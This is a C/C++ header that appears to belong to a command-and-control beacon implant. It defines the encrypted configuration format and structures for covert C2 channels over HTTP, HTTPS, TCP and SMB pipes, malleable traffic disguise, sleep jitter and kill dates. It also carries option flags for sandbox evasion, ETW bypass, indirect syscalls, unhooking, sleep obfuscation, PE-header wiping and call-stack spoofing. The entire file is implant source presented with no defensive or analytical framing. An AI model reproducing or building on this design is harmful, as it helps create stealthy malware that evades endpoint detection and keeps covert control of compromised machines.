#ifndef CONFIG_PARSER_H_
#define CONFIG_PARSER_H_

#include <stdint.h>
#include <stddef.h>
#include "resolver.h"
#include "../libs/bastia/bastia.h"
#include "generated_config.h"

// =============================================================================
// Pandragon Config Format (PCFG) v2 with per-channel malleable config
// =============================================================================
// Binary format:
//   Header (36 bytes): magic, version, reserved, nonce(24), ciphertext_len
//   Ciphertext: encrypted payload
//   MAC (16 bytes): Poly1305 authentication tag

//
// Payload layout:
//   beacon_id[8] + crypto_key[32] + channel_count[1]
//   per-channel: { header + strings + malleable_mode[1] + (inline malleable if 0x01) }
//   sleep_ms[4] + jitter_pct[1] + kill_date[4] + options[2] + lazy_checkin_max[1] + reserved[1]
//   pad_max[2] + num_spoof_frames[2]
//   spawnto_x64[1+len] + spawnto_x86[1+len]
//   has_global_malleable[1] + (global malleable if 0x01)
//   work_hours[6]
//   stack_chain_count[2] + per-entry: module_len[1]+module_str + func_len[1]+func_str
//
// malleable_mode: 0x00 = use global, 0x01 = inline follows, 0xFF = none (TCP)
// =============================================================================

#define PCFG_MAGIC 0x50434647
#define PCFG_VERSION_XCHACHA 0x0002

// =============================================================================
// Binary Format Enums
// =============================================================================

enum PCFG_ChannelType : uint8_t {
    PCFG_CHANNEL_NONE  = 0,
    PCFG_CHANNEL_HTTP  = 1,
    PCFG_CHANNEL_HTTPS = 2,
    PCFG_CHANNEL_TCP   = 3,
    PCFG_CHANNEL_PIPE  = 4  // Named pipe (SMB relay)
};

constexpr uint8_t PCFG_HTTP_METHOD_GET  = 0; // TODO: rework as enum class PCFG_HTTP_METHOD
constexpr uint8_t PCFG_HTTP_METHOD_POST = 1;

// Malleable mode byte (per channel)
constexpr uint8_t PCFG_MALLEABLE_GLOBAL = 0x00;  // use global malleable
constexpr uint8_t PCFG_MALLEABLE_INLINE = 0x01;  // inline malleable block follows
constexpr uint8_t PCFG_MALLEABLE_NONE   = 0xFF;  // no malleable (TCP or bare)

// Payload location types
/* for HTTP types */
constexpr uint8_t PCFG_LOCATION_QUERY_PARAM    = 0;
constexpr uint8_t PCFG_LOCATION_PATH           = 1;
constexpr uint8_t PCFG_LOCATION_BODY           = 2;

// Body content types
/* For HTTP types */
constexpr uint8_t PCFG_BODY_TEXT_PLAIN         = 0;
constexpr uint8_t PCFG_BODY_OCTET_STREAM       = 1;

// =============================================================================
// Linked List: HTTP Header
// =============================================================================
// No upper limit, allocated as linked list at parse time.

struct HTTP_header {
    HTTP_header*  next;
    char*         header;       // header name (malloc'd, null-terminated)
    uint16_t      headerLen;
    char*         value;        // header value (malloc'd, null-terminated)
    uint16_t      valueLen;
};

// =============================================================================
// Payload Location (pointer-based)
// =============================================================================

struct PayloadLocation {
    uint8_t  type;              // PCFG_LOCATION_*
    char*    param_name;        // query param name
    uint8_t  param_name_len;
    char*    path_prefix;       // path mode prefix
    uint8_t  path_prefix_len;
    char*    path_suffix;       // path mode suffix
    uint8_t  path_suffix_len;
    uint8_t  body_content_type; // PCFG_BODY_*
};

// =============================================================================
// Per-Channel Malleable Config (pointer-based)
// =============================================================================

struct PCFG_ChannelMalleable {
    uint8_t       malleable_mode;  // PCFG_MALLEABLE_*
    char*         wrapper_prefix;
    uint8_t       wrapper_prefix_len;
    char*         wrapper_suffix;
    uint8_t       wrapper_suffix_len;
    HTTP_header*  headers;         // linked list head
    uint8_t       numHeaders;
    PayloadLocation payload_location;
};

// =============================================================================
// In-Memory: C2 Channel (pointer-based strings)
// =============================================================================

struct PCFG_C2Channel {
    uint8_t   type;                      // PCFG_ChannelType
    uint8_t   http_method;               // 0=GET, 1=POST
    uint8_t   malleable_mode;            // PCFG_MALLEABLE_*
    uint16_t  port;
    char*     host;                      // malloc'd, null-terminated
    uint8_t   host_len;
    char*     path;                      // malloc'd, null-terminated
    uint8_t   path_len;
    char*     user_agent;                // malloc'd, null-terminated
    uint8_t   ua_len;
    uint8_t   max_consecutive_failures;
    uint32_t  backoff_sleep_ms;
};

// =============================================================================
// Options bitfield
// =============================================================================

struct PCFG_Options {
    uint16_t sandbox_evasion : 1;
    uint16_t debug_mode : 1;
    uint16_t kill_date_set : 1;
    uint16_t validate_ssl : 1;
    uint16_t bypass_etw : 1;
    uint16_t use_indirect_syscalls : 1;
    uint16_t lazy_checkin : 1;
    uint16_t lazy_unhook : 1;
    uint16_t sleep_obfuscation : 2;
    uint16_t sleep_wipe_pe_headers : 1;
    uint16_t sleep_stack_spoof : 1;
    uint16_t pad : 1;               // Enable PKCS#7 padding
    uint16_t indirect_pivot_set : 1;  // Custom pivot API configured
    uint16_t reserved : 2;
};

// =============================================================================
// Work Hours Configuration
// =============================================================================

struct WorkHoursConfig {
    uint8_t  enabled;        // 0 = disabled, 1 = enabled
    uint8_t  start_hour;     // 0-23 (UTC)
    uint8_t  start_minute;   // 0-59
    uint8_t  end_hour;       // 0-23 (UTC)
    uint8_t  end_minute;     // 0-59
    uint8_t  insomnia;       // 0 = sleep until work hours, 1 = wake but skip check-in
};

// =============================================================================
// Stack Spoof Chain Entry
// =============================================================================

typedef struct {
    char*   module;        // DLL name (e.g. "user32.dll"), heap-allocated
    char*   function;      // Export name (e.g. "ZwUserGetMessage"), heap-allocated
    UINT64  resolvedAddr;  // VA of the resolved return address (0 = unresolved)
    uint32_t offset;       // Explicit byte offset from function start (0 = scan for last ret)
} StackChainEntry;

// =============================================================================
// In-Memory: Complete BeaconConfig (pointer-based strings)
// =============================================================================

struct BeaconConfig {
    // Identity
    uint8_t  beacon_id[8];
    uint8_t  crypto_key[32];

    // Channels (malloc'd array)
    PCFG_C2Channel*  channels;     // malloc'd array of channel_count
    uint8_t          channel_count;

    // Timing
    uint32_t  sleep_ms;
    uint8_t   jitter_pct;
    uint32_t  kill_date;

    // Options
    PCFG_Options options;
    uint8_t  lazy_checkin_max;
    uint8_t  indirect_pivot_len;
    char*   indirect_pivot;       // Custom syscalls pivot API (e.g., "ZwAreMappedFilesTheSame")
    uint16_t pad_max;              // Maximum padding length for PKCS#7
    uint16_t num_spoof_frames;     // Additional fake frames on spoofed sleep stack (default 6)

    // Spawn-to configuration (supports %%VAR%% runtime expansion via CreateProcessA)
    uint8_t  spawnto_x64_len;
    char*    spawnto_x64;          // malloc'd, null-terminated
    uint8_t  spawnto_x86_len;
    char*    spawnto_x86;          // malloc'd, null-terminated

    // Per-channel malleable configs (malloc'd array, indexed by channel index)
    PCFG_ChannelMalleable* channel_malleable;  // malloc'd array of channel_count

    // Global malleable config (fallback for channels with malleable_mode == 0x00)
    // Stored as a full PCFG_ChannelMalleable, never cast the whole BeaconConfig as one!
    PCFG_ChannelMalleable global_malleable;
    bool                  has_malleable_config;  // true if global_malleable was parsed

    // Work Hours Configuration (6 bytes)
    WorkHoursConfig work_hours;

    // Stack spoof chain (heap-allocated array, resolved at boot)
    uint16_t         stack_chain_count;
    StackChainEntry* stack_chain;  // malloc'd array of stack_chain_count
};

// =============================================================================
// Function Declarations
// =============================================================================

/**
 * Parse C2 channel from binary data (variable-length format)
 * Binary format: type(1) + http_method(1) + host_len(1) + path_len(1) + ua_len(1) +
 *                reserved(1) + port(2) + max_failures(1) + backoff_ms(4) + host + path + ua +
 *                malleable_mode(1) + (inline malleable if 0x01)
 * @return Number of bytes consumed, or 0 on failure
 */
size_t parseC2Channel(const uint8_t* data, size_t data_len, PCFG_C2Channel* channel, PCFG_ChannelMalleable* chMalleable);

/**
 * Parse complete config blob into BeaconConfig struct
 * Supports v2 (XChaCha20-Poly1305) format
 * Allocates all string fields via __malloc. caller must freeConfig() on exit
 * @return true on success, false on failure
 */
bool parseConfig(functionTable* funcTable, const uint8_t* blob, size_t blob_len, BeaconConfig* config);

/**
 * Free all dynamically allocated fields in BeaconConfig
 * Must be called when beacon exits (or on parse failure cleanup)
 */
void freeConfig(BeaconConfig* config);

#endif // CONFIG_PARSER_H
